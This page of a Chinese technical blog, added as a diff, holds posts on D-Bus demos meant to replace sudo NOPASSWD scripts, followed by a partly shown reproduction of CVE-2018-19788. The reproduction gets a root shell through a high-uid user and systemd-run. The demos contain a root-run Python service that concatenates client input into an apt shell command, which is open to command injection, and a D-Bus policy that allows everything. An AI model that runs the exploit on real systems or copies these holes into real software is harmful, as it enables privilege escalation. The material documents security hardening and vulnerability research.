@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>云老王</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="云老王">
+<meta property="og:url" content="http://yoursite.com/page/18/index.html">
+<meta property="og:site_name" content="云老王">
+<meta property="og:locale">
+<meta property="article:author" content="王">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="云老王" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">云老王</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-dbus-qtdemo使用文档" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/" class="article-date">
+  <time datetime="2022-02-24T08:44:53.000Z" itemprop="datePublished">2022-02-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/">dbus_qtdemo使用文档</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="dbus替代sudo-NOPASSWD的qt方案示例说明"><a href="#dbus替代sudo-NOPASSWD的qt方案示例说明" class="headerlink" title="dbus替代sudo NOPASSWD的qt方案示例说明"></a>dbus替代sudo NOPASSWD的qt方案示例说明</h2><p>撰写人：系统安全组</p>
+<p>此文档提供一种使用dbus的机制来替代系统某些脚本权限过高的问题，我们系统中对一 些管理脚本赋予了sudo的NOPASSWD权限，如果脚本被修改执行，那么脚本可以直接 获取root权限，这个存在很大的安全隐患。 现在使用dbus写了一个demo，demo分为服务端和客戶端，客戶端相当于之前系统中的 管理脚本，只有普通用戶权限，将需要root权限的操作放到server端里去执行。</p>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="实现简介"><a href="#实现简介" class="headerlink" title="实现简介"></a>实现简介</h3><p>qt demo的模拟场景一个是需要root权限执行 autitcl命令时，有客户端发送method call 来请求，由服务端来执行具体的操作，以及一个发送signal的演示</p>
+<h3 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h3><p>需要安装的开发包libdbus-1-dev及需要移动一下头文件:</p>
+<p>$ sudo apt install libdbus-1-dev -y<br>$ sudo cp /usr/lib/x86_64-linux-gnu/dbus-1.0/include/dbus/dbus-arch-deps.h /usr/include/dbus-1.0/dbus/</p>
+<p>服务端编译</p>
+<p>服务端代码是由c写的，进入c_service/编译service代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~/qt$ cd c_service/</span><br><span class="line">wky@wky-pc:~/qt/c_service$ make</span><br></pre></td></tr></table></figure>
+
+<p>移动编译好的demo程序到/usr/bin/: </p>
+<p>wky@wky-pc: sudo cp demo /usr/bin/</p>
+<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><h4 id="1conf配置"><a href="#1conf配置" class="headerlink" title="1conf配置"></a>1conf配置</h4><p>因为使用的是system bus，我们还需要给配置一下接口的conf文件，创建一个/etc/dbus-1/system.d/test1.conf内容如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Bus that listens on a debug pipe and doesn&#x27;t create any restrictions --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span><br><span class="line"> &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;</span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line">  &lt;type&gt;system&lt;/type&gt;</span><br><span class="line"></span><br><span class="line">  &lt;listen&gt;unix:tmpdir=/tmp&lt;/listen&gt;</span><br><span class="line"></span><br><span class="line">  &lt;standard_system_servicedirs /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;policy context=&quot;default&quot;&gt;</span><br><span class="line">    &lt;!-- Allow everything to be sent --&gt;</span><br><span class="line">    &lt;allow send_destination=&quot;*&quot; eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow everything to be received --&gt;</span><br><span class="line">    &lt;allow eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow anyone to own anything --&gt;</span><br><span class="line">    &lt;allow own=&quot;*&quot;/&gt;</span><br><span class="line">    &lt;allow user=&quot;*&quot;/&gt;</span><br><span class="line">  &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此文件中几个关键的配置说明:</p>
+<p> system dbus 服务的bus类型，分为system和session，我们要垮用戶通信，就需要用 system总线 unix:tmpdir=/tmp 设置监听地址</p>
+<p> dbus service文件目录，在/usr/share/dbus-1/system-services下 配置dbus的一些策略</p>
+<p>主要是注册com.dbus.receiver_app，send_interface和send_destination为了方便 调试我这里都是用*。</p>
+<h4 id="2-服务自启动配置"><a href="#2-服务自启动配置" class="headerlink" title="2 服务自启动配置"></a>2 服务自启动配置</h4><p>为了使服务端随着系统启动就进行自启动，需要配置/usr/share/dbus-1/system-services/com.example.SampleService.service文件，示例如下: 在/usr/share/ dbus-1/system-services/下创建一个com.dbus.receiver_app.service</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~$ cat /usr/share/dbus-1/system-services/com.dbus.receiver_app.service</span><br><span class="line">[D-BUS Service]</span><br><span class="line">Name=com.dbus.receiver_app</span><br><span class="line">Exec=/usr/bin/demo receive</span><br><span class="line">User=root</span><br></pre></td></tr></table></figure>
+
+<p>这个文件是用来给dbus服务程序做按需启动的，当客戶端发起请求时，会根据 test1.conf中的 在/usr/share/dbus-1/system-services/找到对应的service文件，来 启动dbus的服务程序。</p>
+<p> Name=com.dbus.receiver_app 这个跟代码里服务程序的bus name对应起来。 Exec=/usr/bin/demo receive 这个为启动服务程序的方式。</p>
+<p> User=root 启动服务程序的用戶，因为我们是为了替代sudo nopasswd权限滥用问 题，服务端就用root就可以。</p>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>编译客户端，进入到src目录中编译qt代码</p>
+<p>wky@wky-pc:~/qt$ cd src/</p>
+<p>wky@wky-pc:~/qt/src$ make</p>
+<p>注：新的qt工程如果要用dbus接口，可能需要在Makefile中的INCPATH参数后面补充上 -I/usr/lib/x86_64-linux-gnu/qt5/mkspecs/linux-g++ -I/usr/include/dbus-1.0 -I/usr/lib/x86_64-linux-gnu/dbus-1.0/include -ldbus-1</p>
+<p>然后执行 ./dbus 启动qt客户端</p>
+<p>客户端一共两个按钮，signal按钮是向服务端发送一个信号，信号的信息填写到  路径 的textedit框中就可以发送给服务端</p>
+<p>如果是手动执行的服务端程序就可以看到服务端打印的信息。</p>
+<p>主要功能是第一个按钮 method call，是模拟执行下面这条命令</p>
+<p>auditctl -w /tmp/111 -p wax -k testaudit</p>
+<p>这条命令普通用户权限是无法执行的，只有root用户有权限</p>
+<p>路径 中填入 /tmp/111</p>
+<p>权限 中填入 wax</p>
+<p>key值 中填入 testaudit</p>
+<p>点击method call ，效果如下，如果服务端运行成功，则返回一个sucess</p>
+<p><img src="/Users/wky/Desktop/work/wangkeyi203.github.io/source/_posts/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/success.png" alt="success"></p>
+<p>此时用root用户执行下面命令可以看到规则已经添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@wky-pc:/home/wky/qt/src# auditctl -l</span><br><span class="line">-w /tmp/111 -p wxa -k testaudit</span><br></pre></td></tr></table></figure>
+
+<p>这时候如果再点击method call ，因为规则已经存在，服务端执行命令失败，则返回一个false</p>
+<p><img src="/Users/wky/Desktop/work/wangkeyi203.github.io/source/_posts/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/false.png" alt="false"></p>
+<p>可以使用root用户执行 auditctl -D 清空规则，再次执行就可以成功</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/" data-id="cl0j9vktk0005lq143w7pditl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qt/" rel="tag">qt</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-dbus配置说明" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/23/dbus%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/" class="article-date">
+  <time datetime="2022-02-23T07:54:39.000Z" itemprop="datePublished">2022-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/02/23/dbus%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/">dbus配置说明</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>以c的dbus demo代码为例子，做一个自启动的dbus服务配置</p>
+<p>首先c demo的源码目录下有一个 test1.conf文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Bus that listens on a debug pipe and doesn&#x27;t create any restrictions --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span><br><span class="line"> &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;</span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line">  &lt;type&gt;system&lt;/type&gt; </span><br><span class="line"></span><br><span class="line">  &lt;listen&gt;unix:tmpdir=/tmp&lt;/listen&gt;</span><br><span class="line"></span><br><span class="line">  &lt;standard_system_servicedirs /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;policy context=&quot;default&quot;&gt;</span><br><span class="line">    &lt;!-- Allow everything to be sent --&gt;</span><br><span class="line">    &lt;allow send_destination=&quot;*&quot; eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow everything to be received --&gt;</span><br><span class="line">    &lt;allow eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow anyone to own anything --&gt;</span><br><span class="line">    &lt;allow own=&quot;*&quot;/&gt;</span><br><span class="line">    &lt;allow user=&quot;*&quot;/&gt;</span><br><span class="line">  &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先将这个文件放到 /etc/dbus-1/system.d/ 下，几个关键的配置说明</p>
+<p><type>system</type>    dbus 服务的bus类型，分为system和session，我们要垮用户通信，就需要用system总线</p>
+<p><listen>unix:tmpdir=/tmp</listen>  设置监听地址</p>
+<p><standard_system_servicedirs />  dbus service文件目录，在/usr/share/dbus-1/system-services下</p>
+<p> <policy context="default"> 配置dbus的一些策略</p>
+<p>然后需要在/usr/share/dbus-1/system-services/下创建一个 com.dbus.receiver_app.service</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/dbus-1/system-services/com.dbus.receiver_app.service</span><br><span class="line">[D-BUS Service]</span><br><span class="line">Name=com.dbus.receiver_app</span><br><span class="line">Exec=/usr/bin/demo receive</span><br><span class="line">User=root</span><br></pre></td></tr></table></figure>
+
+<p>这个文件是用来给dbus服务程序做按需启动的，当客户端发起请求时，会根据 test1.conf中的 <standard_system_servicedirs /> 在/usr/share/dbus-1/system-services/找到对应的service文件，来启动dbus的服务程序</p>
+<p>Name=com.dbus.receiver_app 这个跟代码里服务程序的bus name对应起来</p>
+<p>Exec=/usr/bin/demo receive 这个为启动服务程序的方式</p>
+<p>User=root    启动服务程序的用户，因为我们是为了替代sudo nopasswd权限滥用问题，服务端就用root就可以</p>
+<p>然后把c的源码编译一下，直接make一下，然后将编译好的demo复制一份到/usr/bin/下</p>
+<p>再用普通用户执行 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~/C_dbus$ ./demo send METHOD INT32 99</span><br><span class="line">[59355] Got Method Return INT32: 99</span><br></pre></td></tr></table></figure>
+
+<p>可以获取到服务端返回的返回值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~/C_dbus$ ps aux |grep demo</span><br><span class="line">root       9584  0.0  0.0   5008  1100 ?        S    14:21   0:00 /usr/bin/demo receive</span><br><span class="line">wky       59389  0.0  0.0   9152   888 pts/2    S+   17:24   0:00 grep demo</span><br></pre></td></tr></table></figure>
+
+<p>使用ps查看一下，也可以看到服务端已经以root权限启动了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/02/23/dbus%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/" data-id="cl0j9vktl0008lq148alj7wcj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dbus%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8/" rel="tag">dbus服务自启动</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-dbus方案" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/16/dbus%E6%96%B9%E6%A1%88/" class="article-date">
+  <time datetime="2022-02-16T06:56:21.604Z" itemprop="datePublished">2022-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title: dbus方案<br>date: 2022-02-15 14:56:21<br>tags:</p>
+<ul>
+<li>dbus</li>
+</ul>
+<h2 id="dbus替代系统内使用sudo-nopasswd机制取得root权限方案"><a href="#dbus替代系统内使用sudo-nopasswd机制取得root权限方案" class="headerlink" title="dbus替代系统内使用sudo nopasswd机制取得root权限方案"></a>dbus替代系统内使用sudo nopasswd机制取得root权限方案</h2><p>现在我们系统内一些在普通用户下需要无密码root权限的操作，是通过给对应的脚本或者程序sudo的NOPASSWD权限来实现的，这种实现方式存在很大的安全隐患，如果被配置了sudo的NOPASSWD的脚本被恶意篡改，那将会有很大的安全隐患。</p>
+<h3 id="python-demo"><a href="#python-demo" class="headerlink" title="python demo"></a>python demo</h3><p>以应用商城的安装脚本为例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/cdos-softcenter/apt-get-bash.py</span><br></pre></td></tr></table></figure>
+
+<p>脚本中很多步骤是不需要root权限的，需要的只有 install、remove、update、upgrade等操作，我们可以使用dbus的机制把这一部分操作摘取出来，放到一个服务中去，而其他的操作只给予普通用户权限。</p>
+<p>针对这个我写了一个使用dbus替代的验证demo</p>
+<p>在server端里添加一个回调函数 Test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class SomeObject(dbus.service.Object):</span><br><span class="line"></span><br><span class="line">    @dbus.service.method(&quot;com.example.SampleInterface&quot;,</span><br><span class="line">                         in_signature=&#x27;s&#x27;, out_signature=&#x27;as&#x27;)</span><br><span class="line">    def Test(self, hello_message):</span><br><span class="line">        print(&quot;service:&quot;, str(hello_message))</span><br><span class="line">        cmd=&quot;apt &quot; + hello_message + &quot; -y&quot;</span><br><span class="line">        ret=subprocess.getoutput(cmd)</span><br><span class="line"></span><br><span class="line">        return [ret, &quot;with unique name&quot;,</span><br><span class="line">                session_bus.get_unique_name()]</span><br></pre></td></tr></table></figure>
+
+<p>在client端发送method call来调用server的中的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">        remote_object = bus.get_object(&quot;com.example.SampleService&quot;,</span><br><span class="line">                                       &quot;/SomeObject&quot;)</span><br><span class="line"></span><br><span class="line">        # you can either specify the dbus_interface in each call...</span><br><span class="line">        hello_reply_list = remote_object.Test(cmd,</span><br><span class="line">            dbus_interface = &quot;com.example.SampleInterface&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>使用root用户执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 service.py</span><br></pre></td></tr></table></figure>
+
+<p>普通用户执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 client.py remove d-feet -y</span><br></pre></td></tr></table></figure>
+
+<p>得到执行服务端返回的执行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">client:</span><br><span class="line">WARNING: apt does not have a stable CLI interface. Use with caution in scripts.</span><br><span class="line"></span><br><span class="line">正在读取软件包列表...</span><br><span class="line">正在分析软件包的依赖关系树...</span><br><span class="line">正在读取状态信息...</span><br><span class="line">下列软件包将被【卸载】：</span><br><span class="line">  d-feet</span><br><span class="line">升级了 0 个软件包，新安装了 0 个软件包，要卸载 1 个软件包，有 154 个软件包未被升级。</span><br><span class="line">解压缩后将会空出 597 kB 的空间。</span><br><span class="line">(正在读取数据库 ...</span><br><span class="line">(正在读取数据库 ... 5%</span><br><span class="line">(正在读取数据库 ... 10%</span><br><span class="line">(正在读取数据库 ... 15%</span><br><span class="line">(正在读取数据库 ... 20%</span><br><span class="line">(正在读取数据库 ... 25%</span><br><span class="line">(正在读取数据库 ... 30%</span><br><span class="line">(正在读取数据库 ... 35%</span><br><span class="line">(正在读取数据库 ... 40%</span><br><span class="line">(正在读取数据库 ... 45%</span><br><span class="line">(正在读取数据库 ... 50%</span><br><span class="line">(正在读取数据库 ... 55%</span><br><span class="line">(正在读取数据库 ... 60%</span><br><span class="line">(正在读取数据库 ... 65%</span><br><span class="line">(正在读取数据库 ... 70%</span><br><span class="line">(正在读取数据库 ... 75%</span><br><span class="line">(正在读取数据库 ... 80%</span><br><span class="line">(正在读取数据库 ... 85%</span><br><span class="line">(正在读取数据库 ... 90%</span><br><span class="line">(正在读取数据库 ... 95%</span><br><span class="line">(正在读取数据库 ... 100%</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 200005 个文件和目录。)</span><br><span class="line">正在卸载 d-feet (0.3.14-1) ...</span><br><span class="line">正在处理用于 mime-support (3.62) 的触发器 ...</span><br><span class="line">正在处理用于 hicolor-icon-theme (0.17-2) 的触发器 ...</span><br><span class="line">正在处理用于 libglib2.0-0:amd64 (2.58.3-2+deb10u3+nfs4) 的触发器 ...</span><br><span class="line">正在处理用于 man-db (2.8.5-2) 的触发器 ...</span><br><span class="line">正在处理用于 desktop-file-utils (0.23-4) 的触发器 ...</span><br></pre></td></tr></table></figure>
+
+<h3 id="C-Qt-demo"><a href="#C-Qt-demo" class="headerlink" title="C Qt demo"></a>C Qt demo</h3><p>针对不同的情况我还写了c的dbus的demo和qt的dbus的demo</p>
+<p>c的dbus常用接口可以看dbus-c.md,使用方法可以看demo里的代码</p>
+<p>服务端的代码可以看 dbus_receive()函数</p>
+<p>发送端可以看dbus_send_signal()和dbus_send_method_call(),一个是发送signal，一个是发送method call请求，c的demo中，method call函数是将接收到的数据再原路返回。</p>
+<p>c demo用法</p>
+<p>root用户执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./demo receive</span><br></pre></td></tr></table></figure>
+
+<p>普通用户执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./demo send SIGNAL STRING hello</span><br><span class="line">./demo send METHOD INT32 99</span><br></pre></td></tr></table></figure>
+
+<p>第一个发送signal ，发送数据类型为string，数据为hello，没有返回值</p>
+<p>第二个是发送method call，数据类型为int，数据为99</p>
+<p>在使用c的基础上又写了qt的demo</p>
+<p>callback按钮为发送method call，在第一个输入框内输入字符，发送给服务端，接收返回结果在第二个框内显示，send为发送signal，这个可以使用c demo来作为服务端。</p>
+<p>![q t](./dbus方案/q t.png)</p>
+<h3 id="dbus-api-使用流程图"><a href="#dbus-api-使用流程图" class="headerlink" title="dbus api 使用流程图"></a>dbus api 使用流程图</h3><p>下面流程图为服务端处理method call的流程<br><img src="./dbus%E6%96%B9%E6%A1%88/%E5%BB%BA%E7%AB%8B%E6%9C%8D%E5%8A%A1%E6%B5%81%E7%A8%8B.png" alt="建立服务流程"></p>
+<p>下面流程图为服务端处理信号的流程<br><img src="./dbus%E6%96%B9%E6%A1%88/%E6%9C%8D%E5%8A%A1%E5%A4%84%E7%90%86%E4%BF%A1%E5%8F%B7.png" alt="服务处理信号"></p>
+<p>下面流程图为客户端发送函数调用的流程<br><img src="./dbus%E6%96%B9%E6%A1%88/%E5%8F%91%E9%80%81%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8.png" alt="发送函数调用"></p>
+<p>下面流程图为客户端发送信号的流程图<br><img src="./dbus%E6%96%B9%E6%A1%88/%E6%9C%8D%E5%8A%A1%E5%A4%84%E7%90%86%E4%BF%A1%E5%8F%B7.png" alt="发送信号"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2022/02/16/dbus%E6%96%B9%E6%A1%88/" data-id="cl0j9vktk0004lq1480zn83eg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-cve-2018-19788" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/28/cve-2018-19788/" class="article-date">
+  <time datetime="2022-01-28T07:13:13.000Z" itemprop="datePublished">2022-01-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/28/cve-2018-19788/">cve-2018-19788</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="CVE-2018-19788复现方法"><a href="#CVE-2018-19788复现方法" class="headerlink" title="CVE-2018-19788复现方法"></a>CVE-2018-19788复现方法</h2><p>这个漏洞是任何uid超过4000000000的用户可以在系统上直接执行systemd的命令，复现方法如下</p>
+<p>先创建一个uid超过4000000000的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@nfs2:~# adduser -u 4000000000 wky2</span><br><span class="line">正在添加用户&quot;wky2&quot;...</span><br><span class="line">正在添加新组&quot;wky2&quot; (4000000000)...</span><br><span class="line">正在添加新用户&quot;wky2&quot; (4000000000) 到组&quot;wky2&quot;...</span><br><span class="line">创建主目录&quot;/home/wky2&quot;...</span><br><span class="line">正在从&quot;/etc/skel&quot;复制文件...</span><br><span class="line">输入新的 UNIX 密码：</span><br><span class="line">重新输入新的 UNIX 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">正在改变 wky2 的用户信息</span><br><span class="line">请输入新值，或直接敲回车键以使用默认值</span><br><span class="line">	全名 []:</span><br><span class="line">	房间号码 []:</span><br><span class="line">	工作电话 []:</span><br><span class="line">	家庭电话 []:</span><br><span class="line">	其它 []:</span><br><span class="line">这些信息是否正确？ [Y/n]</span><br><span class="line">root@nfs2:~#</span><br></pre></td></tr></table></figure>
+
+<p>切换到新创建的用户，用户uid为4000000000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nfs2:~# su - wky2</span><br><span class="line">wky2@nfs2:~$ id</span><br><span class="line">uid=4000000000(wky2) gid=4000000000(wky2) 组=4000000000(wky2)</span><br></pre></td></tr></table></figure>
+
+<p>执行下面的命令，就会直接切到root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wky2@nfs2:~$ systemd-run -t /bin/bash</span><br><span class="line"></span><br><span class="line">(process:121458): GLib-GObject-WARNING **: value &quot;-294967296&quot; of type &#x27;gint&#x27; is invalid or out of range for property &#x27;uid&#x27; of type &#x27;gint&#x27;</span><br><span class="line">**</span><br><span class="line">ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) &gt;= 0)</span><br><span class="line">Running as unit: 